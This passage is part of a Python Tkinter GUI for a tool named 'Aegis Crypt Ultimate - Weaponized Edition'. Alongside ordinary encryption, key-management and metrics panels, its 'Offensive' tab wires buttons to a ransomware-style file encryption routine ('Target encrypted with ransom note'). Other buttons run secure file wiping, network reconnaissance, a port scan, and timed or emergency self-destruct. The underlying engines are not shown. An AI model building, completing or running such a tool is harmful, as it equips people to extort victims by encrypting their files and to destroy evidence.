        metrics_frame = ttk.LabelFrame(tab, text="Live Performance")
        metrics_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.metrics_vars = {}
        metric_grid = ttk.Frame(metrics_frame)
        metric_grid.pack(fill=tk.X, padx=5, pady=5)
        
        metrics = [
            ("Operations/sec", "0"),
            ("Avg Speed", "0 MB/s"),
            ("Total Ops", "0"),
            ("Uptime", "0:00:00"),
        ]
        
        for i, (label, value) in enumerate(metrics):
            frame = ttk.Frame(metric_grid)
            frame.grid(row=i//2, column=i%2, sticky=tk.W+tk.E, padx=5, pady=2)
            
            ttk.Label(frame, text=label, font=('Consolas', 8)).pack(anchor=tk.W)
            var = tk.StringVar(value=value)
            value_label = ttk.Label(frame, textvariable=var, 
                                  font=('Consolas', 10, 'bold'),
                                  foreground='#238636')
            value_label.pack(anchor=tk.W)
            
            self.metrics_vars[label] = var
        
        history_frame = ttk.LabelFrame(tab, text="Performance History")
        history_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.history_text = scrolledtext.ScrolledText(history_frame,
                                                     bg='#161b22', fg='#e6edf3',
                                                     font=('Consolas', 9), height=10)
        self.history_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def setup_security_tab(self):
        """Setup security tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🛡️ Security")
        
        audit_frame = ttk.LabelFrame(tab, text="Security Audit")
        audit_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.audit_text = scrolledtext.ScrolledText(audit_frame,
                                                   bg='#161b22', fg='#e6edf3',
                                                   font=('Consolas', 10), height=20)
        self.audit_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        control_frame = ttk.Frame(tab)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(control_frame, text="🔍 Run Security Audit",
                  command=self.run_security_audit).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="📋 Export Report",
                  command=self.export_audit_report).pack(side=tk.LEFT, padx=5)
    
    def setup_offensive_tab(self):
        """Setup offensive tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="⚔️ Offensive")
        
        file_frame = ttk.LabelFrame(tab, text="Targeted File Operations")
        file_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.target_entry = ttk.Entry(file_frame)
        self.target_entry.pack(fill=tk.X, padx=5, pady=2)
        self.target_entry.insert(0, "Select target file...")
        
        file_controls = ttk.Frame(file_frame)
        file_controls.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(file_controls, text="Browse Target", 
                  command=self.browse_target).pack(side=tk.LEFT, padx=5)
        ttk.Button(file_controls, text="Encrypt Target", 
                  command=self.encrypt_target).pack(side=tk.LEFT, padx=5)
        ttk.Button(file_controls, text="Secure Wipe", 
                  command=self.secure_wipe_target).pack(side=tk.LEFT, padx=5)
        
        net_frame = ttk.LabelFrame(tab, text="Network Operations")
        net_frame.pack(fill=tk.X, padx=5, pady=5)
        
        net_controls = ttk.Frame(net_frame)
        net_controls.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(net_controls, text="Network Recon", 
                  command=self.network_recon).pack(side=tk.LEFT, padx=5)
        ttk.Button(net_controls, text="Port Scan", 
                  command=self.port_scan).pack(side=tk.LEFT, padx=5)
        
        sd_frame = ttk.LabelFrame(tab, text="Self-Destruct Mechanism")
        sd_frame.pack(fill=tk.X, padx=5, pady=5)
        
        sd_controls = ttk.Frame(sd_frame)
        sd_controls.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(sd_controls, text="Activate Self-Destruct (1h)", 
                  command=lambda: self.activate_self_destruct(1)).pack(side=tk.LEFT, padx=5)
        ttk.Button(sd_controls, text="Emergency Destruct", 
                  command=self.emergency_destruct).pack(side=tk.LEFT, padx=5)
        
        results_frame = ttk.LabelFrame(tab, text="Operation Results")
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.offensive_results = scrolledtext.ScrolledText(results_frame,
                                                          bg='#161b22', fg='#e6edf3',
                                                          font=('Consolas', 9), height=10)
        self.offensive_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.offensive_results.insert(tk.END, "Offensive operations ready...\n\n")
    
    def setup_status_bar(self):
        """Setup status bar"""
        self.status_frame = ttk.Frame(self.main_frame, style='Dark.TFrame', height=20)
        self.status_frame.pack(fill=tk.X, side=tk.BOTTOM)
        self.status_frame.pack_propagate(False)
        
        self.status_label = ttk.Label(self.status_frame, textvariable=self.status_var, style='Dark.TLabel')
        self.status_label.pack(side=tk.LEFT, padx=10)
        
        self.progress = ttk.Progressbar(self.status_frame, mode='indeterminate')
        self.progress.pack(side=tk.RIGHT, padx=10, pady=2, fill=tk.X, expand=True)
    
    def start_services(self):
        """Start background services"""
        self.update_system_metrics()
        self.update_performance_display()
    
    def update_system_metrics(self):
        """Update system metrics"""
        def update():
            while True:
                try:
                    cpu = self.system_metrics.get_cpu_usage()
                    mem_percent, mem_used = self.system_metrics.get_memory_usage()
                    perf = self.performance_monitor.get_live_metrics()
                    
                    self.cpu_label.config(text=f"{cpu:.1f}%")
                    self.mem_label.config(text=f"{mem_percent:.1f}%")
                    self.stealth_label.config(text="ON" if self.stealth_mode else "OFF")
                    
                    self.metrics_vars["Operations/sec"].set(f"{perf['operations_per_second']:.1f}")
                    self.metrics_vars["Avg Speed"].set(f"{perf['average_speed']:.2f} MB/s")
                    self.metrics_vars["Total Ops"].set(str(perf['total_operations']))
                    self.metrics_vars["Uptime"].set(perf['uptime'])
                    
                except Exception as e:
                    pass
                
                time.sleep(2)
        
        threading.Thread(target=update, daemon=True).start()
    
    def update_performance_display(self):
        """Update performance display"""
        def update():
            while True:
                try:
                    stats = self.crypto_engine.get_performance_stats()
                    
                    content = "WEAPONIZED PERFORMANCE ANALYTICS\n" + "="*50 + "\n\n"
                    content += f"Total Operations: {stats['total_operations']}\n"
                    content += f"Data Processed: {stats['total_data_processed'] / 1024 / 1024:.2f} MB\n"
                    content += f"System Uptime: {stats['uptime']}\n\n"
                    
                    if 'avg_encrypt_speed' in stats:
                        content += f"Avg Encryption Speed: {stats['avg_encrypt_speed']:.2f} MB/s\n"
                    if 'avg_decrypt_speed' in stats:
                        content += f"Avg Decryption Speed: {stats['avg_decrypt_speed']:.2f} MB/s\n"
                    
                    content += f"\nRecent Performance:\n"
                    content += f"• Operations/second: {self.performance_monitor.get_live_metrics()['operations_per_second']:.1f}\n"
                    content += f"• Average Speed: {self.performance_monitor.get_live_metrics()['average_speed']:.2f} MB/s\n"
                    
                    self.history_text.config(state=tk.NORMAL)
                    self.history_text.delete(1.0, tk.END)
                    self.history_text.insert(1.0, content)
                    self.history_text.config(state=tk.DISABLED)
                    
                except Exception as e:
                    pass
                
                time.sleep(3)
        
        threading.Thread(target=update, daemon=True).start()
    
    # Core functionality methods
    def execute_encryption(self):
        """Execute encryption"""
        try:
            input_text = self.input_text.get(1.0, tk.END).strip()
            if not input_text:
                messagebox.showwarning("Input Required", "Please enter text to encrypt")
                return
            
            self.progress.start()
            self.status_var.set("🔄 Encrypting...")
            
            algorithm = self.algo_var.get()
            
            if algorithm == "AES-256-GCM":
                result = self.crypto_engine.encrypt_aes_gcm(input_text)
            elif algorithm == "AES-256-CBC":
                result = self.crypto_engine.encrypt_aes_cbc(input_text)
            elif algorithm == "RSA-2048":
                if not hasattr(self, 'rsa_keys'):
                    key_result = self.crypto_engine.generate_rsa_keypair()
                    self.rsa_keys = key_result
                result = self.crypto_engine.encrypt_rsa(input_text, self.rsa_keys['public_pem'])
            else:
                raise ValueError(f"Unsupported algorithm: {algorithm}")
            
            output = json.dumps(result, indent=2)
            self.output_text.delete(1.0, tk.END)
            self.output_text.insert(1.0, output)
            
            if 'key' in result:
                self.key_display.delete(0, tk.END)
                self.key_display.insert(0, result['key'])
            
            self.status_var.set("🟢 Encryption completed successfully")
            
        except Exception as e:
            self.status_var.set("🔴 Encryption failed")
            messagebox.showerror("Encryption Error", f"Failed to encrypt: {str(e)}")
        finally:
            self.progress.stop()
    
    def execute_decryption(self):
        """Execute decryption"""
        try:
            input_text = self.input_text.get(1.0, tk.END).strip()
            if not input_text:
                messagebox.showwarning("Input Required", "Please enter encrypted data")
                return
            
            encrypted_data = json.loads(input_text)
            key = self.key_display.get().strip()
            
            if not key:
                messagebox.showwarning("Key Required", "Please provide decryption key")
                return
            
            self.progress.start()
            self.status_var.set("🔄 Decrypting...")
            
            algorithm = encrypted_data.get('algorithm', 'AES-256-GCM')
            
            if algorithm == 'AES-256-GCM':
                result = self.crypto_engine.decrypt_aes_gcm(encrypted_data, key)
            elif algorithm == 'AES-256-CBC':
                result = self.crypto_engine.decrypt_aes_cbc(encrypted_data, key)
            elif algorithm == 'RSA-2048-OAEP':
                if not hasattr(self, 'rsa_keys'):
                    raise ValueError("RSA keys not generated")
                result = self.crypto_engine.decrypt_rsa(encrypted_data, self.rsa_keys['private_pem'])
            else:
                raise ValueError(f"Unsupported algorithm: {algorithm}")
            
            self.output_text.delete(1.0, tk.END)
            self.output_text.insert(1.0, result)
            
            self.status_var.set("🟢 Decryption completed successfully")
            
        except Exception as e:
            self.status_var.set("🔴 Decryption failed")
            messagebox.showerror("Decryption Error", f"Failed to decrypt: {str(e)}")
        finally:
            self.progress.stop()
    
    def generate_new_key(self):
        """Generate new key"""
        try:
            key_result = self.crypto_engine.encrypt_aes_gcm("test")
            key = key_result['key']
            
            self.key_display.delete(0, tk.END)
            self.key_display.insert(0, key)
            
            self.status_var.set("🟢 New encryption key generated")
            
        except Exception as e:
            messagebox.showerror("Key Generation Error", f"Failed to generate key: {str(e)}")
    
    def refresh_key_list(self):
        """Refresh key list"""
        try:
            for item in self.key_tree.get_children():
                self.key_tree.delete(item)
            
            keys = self.key_manager.list_keys()
            for key in keys:
                self.key_tree.insert('', tk.END, values=(
                    key['name'],
                    key['type'],
                    key['algorithm'],
                    key['created_at'][:19],
                    key['usage_count']
                ))
            
            self.status_var.set(f"🟢 Loaded {len(keys)} keys")
            
        except Exception as e:
            self.status_var.set("🔴 Failed to load keys")
    
    def generate_key_dialog(self):
        """Generate key dialog"""
        dialog = tk.Toplevel(self.root)
        dialog.title("Generate New Key")
        dialog.geometry("300x200")
        dialog.configure(bg='#0d1117')
        
        tk.Label(dialog, text="Key Name:", bg='#0d1117', fg='white').pack(pady=5)
        name_entry = ttk.Entry(dialog)
        name_entry.pack(pady=5)
        
        tk.Label(dialog, text="Key Type:", bg='#0d1117', fg='white').pack(pady=5)
        type_var = tk.StringVar(value="AES")
        ttk.Combobox(dialog, textvariable=type_var, values=["AES", "RSA"]).pack(pady=5)
        
        def generate():
            name = name_entry.get().strip()
            if not name:
                messagebox.showwarning("Name Required", "Please enter a key name")
                return
            
            try:
                self.key_manager.generate_key(name, type_var.get())
                self.refresh_key_list()
                dialog.destroy()
                self.status_var.set(f"🟢 Generated {type_var.get()} key: {name}")
            except Exception as e:
                messagebox.showerror("Generation Error", f"Failed to generate key: {str(e)}")
        
        ttk.Button(dialog, text="Generate", command=generate).pack(pady=10)
    
    def delete_selected_key(self):
        """Delete selected key"""
        selection = self.key_tree.selection()
        if not selection:
            messagebox.showwarning("Selection Required", "Please select a key to delete")
            return
        
        item = self.key_tree.item(selection[0])
        key_name = item['values'][0]
        
        if messagebox.askyesno("Confirm Delete", f"Delete key '{key_name}'?"):
            try:
                keys = self.key_manager.list_keys()
                key_to_delete = None
                for key in keys:
                    if key['name'] == key_name:
                        key_to_delete = key['id']
                        break
                
                if key_to_delete:
                    self.key_manager.delete_key(key_to_delete)
                    self.refresh_key_list()
                    self.status_var.set(f"🟢 Deleted key: {key_name}")
                else:
                    messagebox.showerror("Error", "Key not found in database")
            except Exception as e:
                messagebox.showerror("Deletion Error", f"Failed to delete key: {str(e)}")
    
    def run_security_audit(self):
        """Run security audit"""
        try:
            self.progress.start()
            self.status_var.set("🔄 Running security audit...")
            
            audit_result = self.security_auditor.perform_security_audit()
            
            content = "WEAPONIZED SECURITY AUDIT REPORT\n" + "="*50 + "\n\n"
            content += f"Audit Date: {audit_result['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}\n"
            content += f"Security Score: {audit_result['score']:.1f}%\n\n"
            
            content += "CHECK RESULTS:\n"
            for check_name, result in audit_result['checks'].items():
                content += f"• {check_name.replace('_', ' ').title()}: {result}\n"
            
            if audit_result['issues']:
                content += f"\nISSUES FOUND ({len(audit_result['issues'])}):\n"
                for issue in audit_result['issues']:
                    content += f"• {issue}\n"
            else:
                content += "\n✅ No security issues found!\n"
            
            content += f"\nWEAPONIZED STATUS: FULLY OPERATIONAL\n"
            
            self.audit_text.config(state=tk.NORMAL)
            self.audit_text.delete(1.0, tk.END)
            self.audit_text.insert(1.0, content)
            self.audit_text.config(state=tk.DISABLED)
            
            self.status_var.set(f"🟢 Security audit completed - Score: {audit_result['score']:.1f}%")
            
        except Exception as e:
            self.status_var.set("🔴 Security audit failed")
            messagebox.showerror("Audit Error", f"Security audit failed: {str(e)}")
        finally:
            self.progress.stop()
    
    def export_audit_report(self):
        """Export audit report"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                content = self.audit_text.get(1.0, tk.END)
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(content)
                self.status_var.set(f"🟢 Audit report exported to {filename}")
            except Exception as e:
                messagebox.showerror("Export Error", f"Failed to export report: {str(e)}")
    
    def copy_output(self):
        """Copy output to clipboard"""
        output = self.output_text.get(1.0, tk.END).strip()
        if output:
            self.root.clipboard_clear()
            self.root.clipboard_append(output)
            self.status_var.set("📋 Output copied to clipboard")
    
    def clear_all(self):
        """Clear all fields"""
        self.input_text.delete(1.0, tk.END)
        self.output_text.delete(1.0, tk.END)
        self.key_display.delete(0, tk.END)
        self.status_var.set("🧹 All fields cleared")
    
    # Weaponized methods
    def run_audit(self):
        """Run audit"""
        try:
            self.notebook.select(3)
            self.run_security_audit()
            self.status_var.set("🔍 Weaponized audit completed")
        except Exception as e:
            self.status_var.set("🔴 Audit failed")
    
    def browse_target(self):
        """Browse target file"""
        target = filedialog.askopenfilename(title="Select Target File")
        if target:
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, target)
    
    def encrypt_target(self):
        """Encrypt target file"""
        target = self.target_entry.get()
        if not target or not os.path.exists(target):
            messagebox.showwarning("Invalid Target", "Please select a valid target file")
            return
        
        try:
            result = self.crypto_engine.encrypt_file_ransomware(target)
            messagebox.showinfo("Target Encrypted", 
                              f"File encrypted successfully!\nRecovery Key: {result['recovery_key']}")
            self.offensive_results.insert(tk.END, f"\n[ENCRYPTED] {target} - Key: {result['recovery_key']}\n")
            self.offensive_results.see(tk.END)
            self.status_var.set("⚔️ Target encrypted with ransom note")
        except Exception as e:
            messagebox.showerror("Encryption Failed", f"Failed to encrypt target: {e}")
    
    def secure_wipe_target(self):
        """Secure wipe target"""
        target = self.target_entry.get()
        if not target or not os.path.exists(target):
            messagebox.showwarning("Invalid Target", "Please select a valid target file")
            return
        
        if messagebox.askyesno("Confirm Wipe", 
                             f"PERMANENTLY wipe {os.path.basename(target)}? This cannot be undone!"):
            if self.crypto_engine.stealth_engine.secure_file_wiping(target):
                self.offensive_results.insert(tk.END, f"\n[WIPED] {target} - Secure deletion completed\n")
                self.offensive_results.see(tk.END)
                messagebox.showinfo("Wipe Complete", "Target securely wiped")
                self.status_var.set("🗑️ Target securely wiped")
            else:
                messagebox.showerror("Wipe Failed", "Failed to wipe target")
    
    def network_recon(self):
        """Network reconnaissance"""
        try:
            net_info = self.system_metrics.network_reconnaissance()
            
            result = "NETWORK INTELLIGENCE REPORT\n" + "="*50 + "\n\n"
            result += f"Hostname: {net_info.get('hostname', 'N/A')}\n"
            result += f"Local IP: {net_info.get('local_ip', 'N/A')}\n\n"
            
            result += "NETWORK INTERFACES:\n"
            for iface, addrs in net_info.get('interfaces', {}).items():
                result += f"  {iface}:\n"
                for addr in addrs:
                    result += f"    {addr['family']}: {addr['address']}\n"
            
            self.offensive_results.insert(tk.END, f"\n[RECON] Network intelligence gathered\n{result}\n")
            self.offensive_results.see(tk.END)
            self.status_var.set("🌐 Network reconnaissance completed")
            
        except Exception as e:
            messagebox.showerror("Recon Failed", f"Network reconnaissance failed: {e}")
    
    def port_scan(self):
        """Port scan"""
        try:
            target = "127.0.0.1"
            open_ports = self.network_ops.port_scanner(target, 1, 100)
            
            result = f"PORT SCAN RESULTS for {target}\n" + "="*50 + "\n"
            if open_ports:
                result += f"Open ports: {', '.join(map(str, open_ports))}\n"
            else:
                result += "No open ports found in range 1-100\n"
            
            self.offensive_results.insert(tk.END, f"\n[SCAN] {result}\n")
            self.offensive_results.see(tk.END)
            self.status_var.set("🔍 Port scan completed")
            
        except Exception as e:
            messagebox.showerror("Scan Failed", f"Port scan failed: {e}")
    
    def activate_self_destruct(self, hours=1):
        """Activate self-destruct"""
        if messagebox.askyesno("Confirm Self-Destruct", 
                             f"Activate self-destruct in {hours} hours?"):
            result = self.crypto_engine.activate_self_destruct(hours)
            self.offensive_results.insert(tk.END, f"\n[SELF-DESTRUCT] {result}\n")
            self.offensive_results.see(tk.END)
            messagebox.showinfo("Self-Destruct Activated", result)
            self.status_var.set("💣 Self-destruct activated")
    
    def emergency_destruct(self):
        """Emergency destruct"""
        if messagebox.askyesno("EMERGENCY DESTRUCT", 
                             "IMMEDIATE SELF-DESTRUCT? ALL DATA WILL BE LOST!"):
            self.crypto_engine.execute_self_destruct()
    
    def show_encryption(self):
        """Show encryption tab"""
        self.notebook.select(0)
    
    def show_keys(self):
        """Show keys tab"""
        self.notebook.select(1)
    
    def show_monitor(self):
        """Show monitor tab"""
        self.notebook.select(2)
    
    def show_offensive(self):
        """Show offensive tab"""
        self.notebook.select(4)

# Main execution
if __name__ == "__main__":
    try:
        print("🚀 Starting Aegis Crypt Ultimate - Weaponized Edition")
        print("All critical bugs fixed - System operational")
        
        root = tk.Tk()
        app = WeaponizedAegisCryptUltimate(root)
        root.mainloop()
        
    except Exception as e:
        print(f"🚨 Application failed to start: {e}")